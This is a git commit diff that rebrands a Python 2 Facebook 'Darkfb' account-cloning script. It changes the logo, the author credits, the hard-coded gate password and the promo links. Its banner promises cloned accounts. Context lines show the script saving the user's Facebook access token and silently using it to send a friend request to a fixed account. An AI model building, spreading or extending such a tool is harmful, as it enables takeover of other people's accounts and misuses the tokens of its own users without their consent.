1e212da6988dcf98cc8ff56ecbfe7bb22e28ce79
Komail Khan <64368068+KomailKhan@users.noreply.github.com>
2020-04-27 06:54:27 +0500

    Update and rename zeroboy.py to Darkfb.py

--- Darkfb.py
+++ Darkfb.py
@@ -47,19 +47,37 @@ def jalan(z):
 
 
 ##### LOGO #####
-logo = """ -----------------------------•◈•
-(  __)\\ ____--------------_------------•◈•
-|__(~)    •||•THE - AAHIL -OFFICAL------•◈•
-|__\~~) •||•RANA - RAJPUT---------------•◈•
-|__(-----\  •◈•------BLACK-TIGER--------•◈•
-|__~~~\ •◈•-----█-------⑦-------█------•◈•
-|__~~~\ •◈•-----█-------⑧-------█------•◈•
-|__~~~\ •◈•-----█-------⑥-------█------•◈•
+logo = """ ------------------------------------•◈•
+(  __)\\ ____--------------_-------------------•◈•
+|__(~) •||•--------KOMAIL - KHAN -OFFICIAL------•◈•
+|__\~~)  •||•-----------KHAN - BRAND---------------•◈•
+|__(-----\  •◈•------PAPPU-BACHA-KOMAIL-------•◈•
+|__~~~\      •◈•-----█-------⑦-------█------•◈•
+|__~~~\      •◈•-----█-------⑧-------█------•◈•
+|__~~~\      •◈•-----█-------⑥-------█------•◈•
+
+ ██ ▄█▀ ▒█████   ███▄ ▄███▓ ▄▄▄       ██▓ ██▓    
+ ██▄█▒ ▒██▒  ██▒▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒    
+▓███▄░ ▒██░  ██▒▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░    
+▓██ █▄ ▒██   ██░▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░    
+▒██▒ █▄░ ████▓▒░▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒
+▒ ▒▒ ▓▒░ ▒░▒░▒░ ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░
+░ ░▒ ▒░  ░ ▒ ▒░ ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░
+░ ░░ ░ ░ ░ ░ ▒  ░      ░     ░   ▒    ▒ ░  ░ ░   
+░  ░       ░ ░         ░         ░  ░ ░      ░  ░
+  
+                             ╔╦╗┌─┐┬─┐┬┌─┌─┐┌┐ 
+                              ║║├─┤├┬┘├┴┐├┤ ├┴┐
+                             ═╩╝┴ ┴┴└─┴ ┴└  └─┘
+ 
+   Warning: Don't use your personal account.                                             
+     Warning: Use a Fresh Account to log in safely.
+     Warning: Wait 20 minutes to get clone Account.
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;FlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1; Aahilrna4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/zero
+\033[1;96mAuthor  \033[1;93m: \033[1;92mKomail Khan
+\033[1;96mInstagram \033[1;93m: \033[1;itx_muskan_yr
+\033[1;96mFacebook  \033[1;93m: \033[1; komail.khan.3781
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/KomailKhan/Darkfb
 \033[1;91m======================================="""
 
 def tik():
@@ -80,15 +98,15 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;92mFlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1;92m Aahilrana4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/zero
+\033[1;96mAuthor  \033[1;93m: \033[1;92mKomail Khan
+\033[1;96mInstagram \033[1;93m: \033[1;92mitx_muskan_yr
+\033[1;96mFacebook  \033[1;93m: \033[1;92m komail.khan.3781
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/KomailKhan/Darkfb
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "komail"
+CorrectPassword = "khan"
 
 loop = 'true'
 while (loop == 'true'):
@@ -100,10 +118,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+        os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ')
 
 def login():
 	os.system('clear')
@@ -144,7 +162,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://www.Facebook.com/komail.khan.3781')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
